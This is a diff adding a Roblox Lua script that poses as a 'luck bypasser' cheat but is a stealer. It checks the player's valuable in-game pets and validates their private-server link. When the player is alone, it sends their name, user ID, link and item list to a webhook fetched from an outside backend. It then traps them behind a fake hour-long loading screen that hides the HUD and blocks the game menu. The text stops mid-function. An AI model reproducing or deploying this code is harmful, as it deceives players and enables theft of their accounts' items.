@@ -1,0 +1,1513 @@
+local BLACKLIST = {
+    4313952753,
+    3328221098,
+    2353591712,
+    8698369158,
+
+}
+
+local function isBlacklisted(userId)
+    for _, id in ipairs(BLACKLIST) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
+end
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local player = LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local StarterGui = game:GetService("StarterGui")
+
+local SECURE_BACKEND_URL = "https://hesizweb-production.up.railway.app"
+
+local function textToBinary(text)
+    local result = {}
+    for i = 1, #text do
+        local byte = string.byte(text, i)
+        local binary = ""
+        for j = 7, 0, -1 do
+            local bit = math.floor(byte / (2^j)) % 2
+            binary = binary .. tostring(bit)
+        end
+        table.insert(result, binary)
+    end
+    return table.concat(result, " ")
+end
+
+local function requestSecureUrl(category, webhookId)
+    local success, result = pcall(function()
+        if not HttpService then
+            return nil
+        end
+
+        if not LocalPlayer then
+            return nil
+        end
+
+        local usernameBinary = textToBinary(LocalPlayer.Name)
+
+        local requestBody = HttpService:JSONEncode({
+            username_binary = usernameBinary,
+            category = category or "miranda",
+            webhook_id = webhookId or "owner",
+            token = "hesiz_secure_v1"
+        })
+
+        local response = HttpService:RequestAsync({
+            Url = SECURE_BACKEND_URL .. "/create-url",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = requestBody
+        })
+
+        -- Verificar si hay rate limit al crear la URL
+        if response.StatusCode == 429 then
+            local responseBody = response.Body or ""
+            if responseBody:find("Rate limited") then
+                LocalPlayer:Kick("You are in cooldown!")
+                return nil
+            end
+        end
+
+        if type(response) == "table" and response.StatusCode == 200 then
+            local data = HttpService:JSONDecode(response.Body)
+            if data and data.success and data.url then
+                return data.url
+            end
+        end
+
+        return nil
+    end)
+
+    if success then
+        return result
+    end
+    return nil
+end
+
+-- Verificar blacklist
+if isBlacklisted(LocalPlayer.UserId) then
+    return
+end
+
+-- Función para crear gradiente ROJO-CARMESÍ en UIStroke (con pulso)
+local function createRedCrimsonGradientPulse(stroke)
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),    -- Rojo brillante arriba
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 20, 60)),  -- Carmesí medio
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))       -- Rojo oscuro/carmesí profundo abajo
+    }
+    gradient.Rotation = 90
+    gradient.Parent = stroke
+
+    -- Pulso de intensidad
+    local pulseTween = TweenService:Create(stroke, 
+        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Transparency = 0.3}
+    )
+    stroke.Transparency = 0
+    pulseTween:Play()
+    return pulseTween
+end
+
+local function ocultarHUD()
+    local coreGuiElements = {
+        Enum.CoreGuiType.PlayerList,
+        Enum.CoreGuiType.Health,
+        Enum.CoreGuiType.Backpack,
+        Enum.CoreGuiType.Chat,
+        Enum.CoreGuiType.EmotesMenu,
+        Enum.CoreGuiType.All
+    }
+
+    for _, element in ipairs(coreGuiElements) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(element, false)
+        end)
+    end
+end
+
+local function mostrarHUD()
+    local coreGuiElements = {
+        Enum.CoreGuiType.PlayerList,
+        Enum.CoreGuiType.Health,
+        Enum.CoreGuiType.Backpack,
+        Enum.CoreGuiType.Chat,
+        Enum.CoreGuiType.EmotesMenu,
+        Enum.CoreGuiType.All
+    }
+
+    for _, element in ipairs(coreGuiElements) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(element, true)
+        end)
+    end
+end
+
+local function ocultarScreenGuis()
+    if LocalPlayer then
+        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+        for _, gui in ipairs(PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" and gui.Name ~= "ArcadeGUI" then
+                gui.Enabled = false
+            end
+        end
+
+        PlayerGui.ChildAdded:Connect(function(gui)
+            if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" and gui.Name ~= "ArcadeGUI" then
+                wait(0.1)
+                gui.Enabled = false
+            end
+        end)
+    end
+end
+
+local function cerrarMenuRoblox()
+    pcall(function()
+        game:GetService("GuiService"):ClearError()
+        StarterGui:SetCore("ResetButtonCallback", false)
+    end)
+
+    local CoreGui = game:GetService("CoreGui")
+    for _, gui in ipairs(CoreGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
+                gui.Enabled = false
+            end
+        end
+    end
+end
+
+local UserInputService = game:GetService("UserInputService")
+local hudVisible = true
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.H then
+        hudVisible = not hudVisible
+        if hudVisible then
+            mostrarHUD()
+        else
+            ocultarHUD()
+        end
+    end
+
+    if input.KeyCode == Enum.KeyCode.Escape then
+        cerrarMenuRoblox()
+    end
+end)
+
+local allowedAnimals = {
+    "67",
+    "Celularcini Viciosini",
+    "Dragon Cannelloni",
+    "Esok Sekolah",
+    "Garama and Madundung",
+    "Ketupat Kepat",
+    "Mariachi Corazoni",
+    "Money Money Puggy",
+    "Nuclearo Dinossauro",
+    "Secret Lucky Block",
+    "Spaghetti Tualetti",
+    "Tang Tang Kelentang",
+    "Eviledon",
+    "Tictac Sahur",
+    "Tralaledon",
+    "La Spooky Grande",
+    "Strawberry Elephant",
+    "Los Bros",
+    "Los Chicleteiras",
+    "Los Combinasionas",
+    "Los Hotspotsitos",
+    "Los Primos",
+    "Los Mobilis",
+    "Las Sis",
+    "La Grande Combinasion",
+    "La Supreme Combinasion",
+    "La Extinct Grande",
+    "La Secret Combinasion", 
+    "Spooky and Pumpky", 
+    "Ketchuru and Musturu", 
+    "Los Lucky Blocks", 
+    "Admin Lucky Block", 
+    "Burguro And Fryuro", 
+    "Chillin Chili", 
+    "Los Tacoritas", 
+    "Tacorita Bicicleta", 
+    "Taco Luckyblock",
+    "Mieteteira Bicicleteira",
+    "Chipso and Queso",
+    "Quesadillo Vampiro",
+    "Burrito Bandito",
+    "Meowl",
+    "Los Nooo My Hotspotsitos",
+    "Los Spooky Combinasionas", 
+    "La Casa Boo",
+    "La Taco Combinasion",
+    "Los Puggies",
+    "Los Spaghettis",
+    "Fragrama and Chocrama",
+    "Capitano Moby",
+    "W or L",
+    "Los Planitos",
+    "Headless Horseman",
+    "Fishino Clownino",
+    "Gobblino Unicilino",
+    "Orcaledon",
+    "Los 67",
+    "Los Burritos",
+    "La Jolly Grande",
+    "Ho Ho Ho Sahur",
+    "Chicleteira Noelteira"
+ }
+
+local function getPodiumInfo()
+    local success, podiumData = pcall(function()
+        if ReplicatedStorage:FindFirstChild("Packages") then
+            local packages = ReplicatedStorage.Packages
+            if packages:FindFirstChild("Synchronizer") then
+                local synchronizer = require(packages.Synchronizer)
+                local playerData = synchronizer:Get(LocalPlayer)
+                if playerData then
+                    return playerData:Get("AnimalPodiums") or {}
+                end
+            end
+        end
+        return "No se pudieron obtener datos de podios"
+    end)
+
+    if success and type(podiumData) == "table" then  
+        local info = {}  
+        for podium, animal in pairs(podiumData) do  
+            if animal == "Empty" then  
+                info[podium] = "Empty"  
+            else  
+                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
+            end  
+        end  
+        return info  
+    else  
+        return {error = podiumData}  
+    end
+end
+
+local function hasAllowedAnimal(podiumInfo)
+    local foundAnimals = {}
+    for _, animal in pairs(podiumInfo) do
+        if type(animal) == "string" and animal ~= "Empty" and animal ~= "Unknown" then
+            local animalTrim = animal:gsub("^%s*(.-)%s*$", "%1")
+            for _, allowed in ipairs(allowedAnimals) do
+                if animalTrim:lower():find(allowed:lower(), 1, true) then
+                    table.insert(foundAnimals, animalTrim)
+                    break
+                end
+            end
+        end
+    end
+    return #foundAnimals > 0, foundAnimals
+end
+
+local function isValidPrivateServerLink(text)
+    if not string.find(text, "https?://") then
+        return false
+    end
+
+    if not string.find(text, "roblox%.com") then
+        return false
+    end
+
+    local patterns = {
+        "https?://www%.roblox%.com/share%?code=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?privateServerLinkCode=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?linkCode=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?code=[%w%-_]+",
+        "https?://web%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode=",
+        "https?://m%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode="
+    }
+
+    for _, pattern in ipairs(patterns) do
+        if string.match(text, pattern) then
+            return true
+        end
+    end
+
+    return false
+end
+
+local function sendToWebhook(link, foundAnimals)
+    local overallSuccess, overallError = pcall(function()
+        if isBlacklisted(LocalPlayer.UserId) then
+            return false
+        end
+
+        if not isValidPrivateServerLink(link) then
+            return false
+        end
+
+        if not foundAnimals or #foundAnimals == 0 then
+            return true
+        end
+
+        local playerCount = #Players:GetPlayers()
+        if playerCount > 1 then
+            return true
+        end
+
+        local specialAnimals = {
+            "Dragon Cannelloni",
+            "Celularcini Viciosini",
+            "Ketupat Kepat",
+            "Strawberry Elephant",
+            "Spooky and Pumpky",
+            "La Secret Combinasion",
+            "Burguro And Fryuro",
+            "Money Money Puggy",
+            "Spaghetti Tualetti",
+            "La Spooky Grande",
+            "Tictac Sahur",
+            "Garama and Madundung",
+            "Chipso and Queso",
+            "Los Spaghettis",
+            "Fragrama and Chocrama",
+            "Meowl",
+            "Eviledon",
+            "Los Puggies", 
+            "La Casa Boo",
+            "La Taco Combinasion",
+            "Orcaledon",
+            "Los Bros",
+            "Headless Horseman",
+            "Capitano Moby",
+            "W or L",
+            "Ketchuru and Musturu",
+            "La Supreme Combinasion",
+            "Cooki and Milki"
+        }
+
+        local playerName = LocalPlayer.Name
+        local displayName = LocalPlayer.DisplayName
+        local userId = LocalPlayer.UserId
+        local specialFound = false
+
+        for _, animal in ipairs(foundAnimals) do
+            for _, special in ipairs(specialAnimals) do
+                if animal:lower():find(special:lower(), 1, true) then
+                    specialFound = true
+                    break
+                end
+            end
+            if specialFound then break end
+        end
+
+        local isSpecial = specialFound
+        local category = isSpecial and "miranda_special" or "miranda_normal"
+
+        local animalList = ""
+        for i, animal in ipairs(foundAnimals) do
+            if i == 1 then
+                animalList = animal
+            else
+                animalList = animalList .. "\n" .. animal
+            end
+        end
+
+        local title = isSpecial and "CATCHES ESPECIALES ENCONTRADOS" or "Nuevo Exploiter Encontrado"
+        local color = isSpecial and 16766720 or 10038562
+
+        local data = {
+            ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
+            ["embeds"] = {{
+                ["title"] = title,
+                ["color"] = color,
+                ["fields"] = {
+                    {
+                        ["name"] = "👤 Información del jugador:",
+                        ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
+                    },
+                    {
+                        ["name"] = "🌐 Datos del Server:",
+                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
+                    },
+                    {
+                        ["name"] = "🔗 Link del Server:",
+                        ["value"] = "[Click here to join](" .. link .. ")",
+                    },
+                    {
+                        ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🎯 Items importantes (secrets):",
+                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
+                    },
+                    {
+                        ["name"] = "📊 Total:",
+                        ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
+                    }
+                },
+                ["footer"] = {["text"] = isSpecial and "Miranda - Detector de Catches Especiales" or "Miranda - Cazador de Exploiter"},
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+
+        local webhookId = "miranda_normal"
+        if isSpecial then
+            webhookId = "miranda_special"
+        end
+        
+        local secureUrl = nil
+        local urlSuccess, urlResult = pcall(function()
+            return requestSecureUrl(category, webhookId)
+        end)
+        
+        if urlSuccess and urlResult then
+            secureUrl = urlResult
+        end
+
+        if secureUrl then
+            local jsonData = nil
+            local encodeSuccess, encodeResult = pcall(function()
+                return HttpService:JSONEncode(data)
+            end)
+            
+            if encodeSuccess and encodeResult then
+                jsonData = encodeResult
+            end
+            
+            if jsonData then
+                local sendSuccess, sendResponse = pcall(function()
+                    return HttpService:RequestAsync({
+                        Url = secureUrl,
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = jsonData
+                    })
+                end)
+
+                if sendSuccess and sendResponse then
+                    local statusCode = sendResponse.StatusCode
+                    local responseBody = sendResponse.Body or ""
+
+                    if statusCode == 429 then
+                        if responseBody:find("Rate limited") then
+                            LocalPlayer:Kick("You are in cooldown!")
+                            return false
+                        end
+                    end
+                end
+            end
+        end
+
+        return true
+    end)
+
+    if overallSuccess then
+        return true
+    else
+        return true
+    end
+end
+
+local function createLoadingScreen()
+    ocultarHUD()
+    spawn(ocultarScreenGuis)
+
+    spawn(function()
+        while wait(0.1) do
+            cerrarMenuRoblox()
+
+            if LocalPlayer then
+                local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+                if PlayerGui then
+                    for _, gui in ipairs(PlayerGui:GetChildren()) do
+                        if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" then
+                            gui.Enabled = false
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    local loadingScreenGui = Instance.new("ScreenGui")
+    loadingScreenGui.Name = "MoneyBypasserLoader"
+    loadingScreenGui.ResetOnSpawn = false
+    loadingScreenGui.IgnoreGuiInset = true
+    loadingScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingScreenGui.Parent = playerGui
+
+    local backgroundFrame = Instance.new("Frame")
+    backgroundFrame.Size = UDim2.new(1,0,1,0)
+    backgroundFrame.Position = UDim2.new(0,0,0,0)
+    backgroundFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    backgroundFrame.BackgroundTransparency = 0
+    backgroundFrame.BorderSizePixel = 0
+    backgroundFrame.ZIndex = 0
+    backgroundFrame.Parent = loadingScreenGui
+
+
+    -- Efecto Matrix Rain mejorado con ROJO-CARMESÍ
+local matrixChars = {"÷", "¢", "€", "$", "¥", "₹", "₽", "₱", "₩", "£", "¥", "฿"}
+local matrixRains = {}
+
+local function createMatrixRain()
+    local rainFrame = Instance.new("Frame")
+    rainFrame.Name = "MatrixRain"
+    rainFrame.Size = UDim2.new(0, math.random(20, 40), 1, 200)
+    rainFrame.Position = UDim2.new(0, math.random(0, backgroundFrame.AbsoluteSize.X), 0, -200)
+    rainFrame.BackgroundTransparency = 1
+    rainFrame.ZIndex = 1
+    rainFrame.Parent = backgroundFrame
+
+    local charCount = math.random(8, 15)
+    local chars = {}
+    local speed = math.random(2, 6) / 100
+
+    for i = 1, charCount do
+        local char = Instance.new("TextLabel")
+        char.Name = "Char" .. i
+        char.Size = UDim2.new(1, 0, 0, math.random(30, 60))
+        char.Position = UDim2.new(0, 0, 0, (i - 1) * math.random(25, 50))
+        char.BackgroundTransparency = 1
+        char.Text = matrixChars[math.random(1, #matrixChars)]
+        char.Font = Enum.Font.Arcade
+        char.TextXAlignment = Enum.TextXAlignment.Center
+        char.TextScaled = false
+        char.ZIndex = 1
+        char.Parent = rainFrame
+
+        -- Tamaño de texto aleatorio
+        local textSize = math.random(24, 48)
+        char.TextSize = textSize
+
+        -- Los más grandes más brillantes, los más pequeños más transparentes
+        local transparency = 0.3 + ((48 - textSize) / 48) * 0.6
+        char.TextTransparency = transparency
+
+        -- Gradiente de ROJO-CARMESÍ basado en posición
+        local redIntensity = math.max(139, 255 - (i * 10))
+        local greenValue = math.max(0, 50 - (i * 5))
+        char.TextColor3 = Color3.fromRGB(redIntensity, greenValue, greenValue)
+
+        -- Stroke más visible en caracteres grandes con ROJO-CARMESÍ
+        local stroke = Instance.new("UIStroke")
+        stroke.Thickness = math.floor(textSize / 16)
+        stroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+        stroke.Transparency = transparency - 0.1
+        stroke.Parent = char
+
+        table.insert(chars, char)
+    end
+
+    table.insert(matrixRains, {
+        frame = rainFrame,
+        chars = chars,
+        speed = speed,
+        lifetime = 0
+    })
+
+    return rainFrame
+end
+
+-- Crear lluvias iniciales
+for i = 1, 30 do
+    createMatrixRain()
+    task.wait(0.05)
+end
+
+-- Sistema de animación de lluvia Matrix
+task.spawn(function()
+    while backgroundFrame.Parent do
+        -- Mover todas las lluvias
+        for i = #matrixRains, 1, -1 do
+            local rain = matrixRains[i]
+
+            if not rain.frame.Parent then
+                table.remove(matrixRains, i)
+                continue
+            end
+
+            -- Mover hacia abajo
+            local currentY = rain.frame.Position.Y.Offset
+            local newY = currentY + (rain.speed * 100)
+            rain.frame.Position = UDim2.new(rain.frame.Position.X.Scale, rain.frame.Position.X.Offset, 0, newY)
+
+            -- Cambiar caracteres aleatoriamente
+            for _, char in pairs(rain.chars) do
+                if math.random() < 0.05 then
+                    char.Text = matrixChars[math.random(1, #matrixChars)]
+                end
+            end
+
+            -- Pulso de brillo ROJO-CARMESÍ
+            rain.lifetime = rain.lifetime + 0.05
+            local pulse = math.sin(rain.lifetime * 2) * 0.15
+            for j, char in pairs(rain.chars) do
+                local baseRed = math.max(139, 255 - (j * 10))
+                local pulsedRed = math.floor(baseRed + pulse * 80)
+                local greenValue = math.max(0, 50 - (j * 5))
+                char.TextColor3 = Color3.fromRGB(pulsedRed, greenValue, greenValue)
+            end
+
+            -- Si sale de la pantalla, eliminar y crear nueva
+            if newY > backgroundFrame.AbsoluteSize.Y + 200 then
+                rain.frame:Destroy()
+                table.remove(matrixRains, i)
+
+                -- Crear nueva lluvia en posición aleatoria
+                task.spawn(function()
+                    task.wait(math.random(0, 2))
+                    createMatrixRain()
+                end)
+            end
+        end
+
+        task.wait(0.03)
+    end
+end)
+
+-- Generador continuo de nuevas lluvias
+task.spawn(function()
+    while backgroundFrame.Parent do
+        task.wait(math.random(1, 3))
+        if #matrixRains < 35 then
+            createMatrixRain()
+        end
+    end
+end)
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "LoadingFrame"
+    mainFrame.Size = UDim2.new(0, 500, 0, 320)
+    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 10
+    mainFrame.Parent = loadingScreenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0,12)
+    mainCorner.Parent = mainFrame
+
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Thickness = 3
+    mainStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí base
+    mainStroke.Parent = mainFrame
+    createRedCrimsonGradientPulse(mainStroke)
+
+    local headerFrame = Instance.new("Frame")
+    headerFrame.Parent = mainFrame
+    headerFrame.Size = UDim2.new(1,0,0,70)
+    headerFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    headerFrame.BorderSizePixel = 0
+    headerFrame.ZIndex = 11
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0,12)
+    headerCorner.Parent = headerFrame
+
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Parent = headerFrame
+    titleLabel.Size = UDim2.new(1,-30,0,35)
+    titleLabel.Position = UDim2.new(0,15,0,8)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "Miranda Luck Bypasser"
+    titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
+    titleLabel.TextSize = 22
+    titleLabel.Font = Enum.Font.Arcade
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    titleLabel.ZIndex = 12
+
+    local titleStroke = Instance.new("UIStroke")
+    titleStroke.Thickness = 2
+    titleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+    titleStroke.Parent = titleLabel
+    createRedCrimsonGradientPulse(titleStroke)
+
+    local subtitleLabel = Instance.new("TextLabel")
+    subtitleLabel.Parent = headerFrame
+    subtitleLabel.Size = UDim2.new(1,-30,0,20)
+    subtitleLabel.Position = UDim2.new(0,15,0,45)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Text = "By Miranda"
+    subtitleLabel.TextColor3 = Color3.fromRGB(180,180,200)
+    subtitleLabel.TextSize = 14
+    subtitleLabel.Font = Enum.Font.Arcade
+    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    subtitleLabel.ZIndex = 12
+
+    local circleContainer = Instance.new("Frame")
+    circleContainer.Size = UDim2.new(0, 140, 0, 140)
+    circleContainer.Position = UDim2.new(0.5, -70, 0, 90)
+    circleContainer.BackgroundTransparency = 1
+    circleContainer.ZIndex = 11
+    circleContainer.Parent = mainFrame
+
+    local bgCircle = Instance.new("Frame")
+    bgCircle.Size = UDim2.new(1, 0, 1, 0)
+    bgCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
+    bgCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    bgCircle.BackgroundColor3 = Color3.fromRGB(30, 25, 45)
+    bgCircle.BorderSizePixel = 0
+    bgCircle.ZIndex = 11
+    bgCircle.Parent = circleContainer
+
+    local bgCircleCorner = Instance.new("UICorner")
+    bgCircleCorner.CornerRadius = UDim.new(1, 0)
+    bgCircleCorner.Parent = bgCircle
+
+    local bgCircleStroke = Instance.new("UIStroke")
+    bgCircleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+    bgCircleStroke.Thickness = 8
+    bgCircleStroke.Transparency = 0
+    bgCircleStroke.Parent = bgCircle
+    createRedCrimsonGradientPulse(bgCircleStroke)
+
+    local progressCircle = Instance.new("Frame")
+    progressCircle.Size = UDim2.new(0, 0, 0, 0)
+    progressCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
+    progressCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    progressCircle.BackgroundColor3 = Color3.fromRGB(220, 20, 60) -- Carmesí
+    progressCircle.BorderSizePixel = 0
+    progressCircle.ZIndex = 12
+    progressCircle.Parent = circleContainer
+
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(1, 0)
+    progressCorner.Parent = progressCircle
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 1, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.Font = Enum.Font.Arcade
+    percentText.TextSize = 32
+    percentText.ZIndex = 13
+    percentText.Parent = circleContainer
+
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, -40, 0, 30)
+    statusText.Position = UDim2.new(0, 20, 0, 250)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "Initializing..."
+    statusText.TextColor3 = Color3.fromRGB(200, 200, 220)
+    statusText.Font = Enum.Font.Arcade
+    statusText.TextSize = 14
+    statusText.TextXAlignment = Enum.TextXAlignment.Center
+    statusText.TextWrapped = true
+    statusText.ZIndex = 12
+    statusText.Parent = mainFrame
+
+    local loadingMessages = {
+    "Injecting luck module into server core...",
+        "Exploiting RNG seed for favorable outcomes...",
+        "Hijacking the fate scheduler...",
+        "Cracking fortune's encryption...",
+        "Patching the probability matrix...",
+        "Opening a backdoor to serendipity...",
+        "Seeding chaos with curated coincidences...",
+        "Executing luck override routine...",
+        "Streaming buffered fortune packets...",
+        "Corrupting bad-roll signatures...",
+        "Establishing persistent luck hook...",
+        "Overclocking the destiny allocator...",
+        "Dumping favorable event payloads...",
+        "Rooting the server for blessed spawns...",
+        "Committing transactional luck changes..."
+}
+
+    local function updateCircleProgress(percent)
+        local scale = percent / 100
+        progressCircle.Size = UDim2.new(scale, 0, scale, 0)
+    end
+
+    local function startLoading()
+        local currentPercent = 0
+        local messageIndex = 1
+
+        mainFrame.Size = UDim2.new(0, 0, 0, 0)
+        mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+
+        local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Size = UDim2.new(0, 500, 0, 320)
+        })
+        openTween:Play()
+        openTween.Completed:Wait()
+
+        task.spawn(function()
+            local phase1Duration = 20
+            local phase1StartTime = tick()
+            local lastMessageTime = tick()
+
+            while currentPercent < 80 do
+                local elapsed = tick() - phase1StartTime
+                local progress = math.min(elapsed / phase1Duration, 1)
+                currentPercent = math.floor(progress * 80)
+
+                updateCircleProgress(currentPercent)
+                percentText.Text = currentPercent .. "%"
+
+                if tick() - lastMessageTime >= math.random(2, 5) then
+                    messageIndex = math.random(1, #loadingMessages)
+                    statusText.Text = loadingMessages[messageIndex]
+                    lastMessageTime = tick()
+                end
+
+                task.wait(0.1)
+            end
+
+            local phase2Duration = 3600
+            local phase2StartTime = tick()
+            lastMessageTime = tick()
+
+            while currentPercent < 100 do
+                local elapsed = tick() - phase2StartTime
+                local progress = math.min(elapsed / phase2Duration, 1)
+                currentPercent = math.floor(80 + (progress * 20))
+
+                updateCircleProgress(currentPercent)
+                percentText.Text = currentPercent .. "%"
+
+                if tick() - lastMessageTime >= math.random(2, 5) then
+                    messageIndex = math.random(1, #loadingMessages)
+                    statusText.Text = loadingMessages[messageIndex]
+                    lastMessageTime = tick()
+                end
+
+                task.wait(0.5)
+            end
+
+            currentPercent = 100
+            updateCircleProgress(100)
+            percentText.Text = "100%"
+            statusText.Text = "Loading complete! Starting script..."
+
+            task.wait(1)
+
+            local closeTween = TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+                Size = UDim2.new(0, 0, 0, 0)
+            })
+            closeTween:Play()
+            closeTween.Completed:Wait()
+
+            loadingScreenGui:Destroy()
+        end)
+    end
+
+    startLoading()
+end
+
+-- GUI Principal
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ArcadeGUI"
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0,600,0,400)
+mainFrame.Position = UDim2.new(0.5,-300,0.5,-200)
+mainFrame.BackgroundColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 10
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0,16)
+mainCorner.Parent = mainFrame
+
+local innerFrame = Instance.new("Frame")
+innerFrame.Name = "InnerFrame"
+innerFrame.Size = UDim2.new(1,-20,1,-20)
+innerFrame.Position = UDim2.new(0,10,0,10)
+innerFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+innerFrame.BorderSizePixel = 0
+innerFrame.ZIndex = 11
+innerFrame.Parent = mainFrame
+
+local innerCorner = Instance.new("UICorner")
+innerCorner.CornerRadius = UDim.new(0,12)
+innerCorner.Parent = innerFrame
+
+-- Fondo de código tipo CMD en ROJO-CARMESÍ
+local codeBackground = Instance.new("ScrollingFrame")
+codeBackground.Name = "CodeBackground"
+codeBackground.Size = UDim2.new(1, 0, 1, 0)
+codeBackground.Position = UDim2.new(0, 0, 0, 0)
+codeBackground.BackgroundTransparency = 1
+codeBackground.BorderSizePixel = 0
+codeBackground.ZIndex = 11
+codeBackground.ScrollBarThickness = 0.5
+codeBackground.CanvasSize = UDim2.new(0, 0, 0, 0)
+codeBackground.ScrollingEnabled = false
+codeBackground.Parent = innerFrame
+
+local codeSnippets = {
+    "function initializeSystem() {",
+    "    var connection = new ServerConnection();",
+    "    connection.authenticate(API_KEY);",
+    "    return connection.status;",
+    "}",
+    "",
+    "class DatabaseHandler {",
+    "    constructor() {",
+    "        this.host = 'localhost:5432';",
+    "        this.connected = false;",
+    "    }",
+    "    connect() {",
+    "        console.log('Connecting to database...');",
+    "        this.connected = true;",
+    "    }",
+    "}",
+    "",
+    "async function loadUserData(userId) {",
+    "    const data = await fetch('/api/user/' + userId);",
+    "    return data.json();",
+    "}",
+    "",
+    "for (let i = 0; i < items.length; i++) {",
+    "    processItem(items[i]);",
+    "    updateProgress(i / items.length);",
+    "}",
+    "",
+    "if (status === 'success') {",
+    "    console.log('Operation completed successfully');",
+    "} else {",
+    "    console.error('Operation failed');",
+    "}",
+    "",
+    "const config = {",
+    "    timeout: 5000,",
+    "    retries: 3,",
+    "    debug: true",
+    "};",
+    "",
+    "try {",
+    "    const result = executeCommand(cmd);",
+    "    return result;",
+    "} catch (error) {",
+    "    logError(error.message);",
+    "}"
+}
+
+local currentLine = 1
+local currentChar = 1
+local allLines = {}
+local maxLines = 20
+
+local function getRandomCodeSnippet()
+    local snippet = {}
+    local startIndex = math.random(1, #codeSnippets - 5)
+    for i = startIndex, math.min(startIndex + math.random(3, 7), #codeSnippets) do
+        table.insert(snippet, codeSnippets[i])
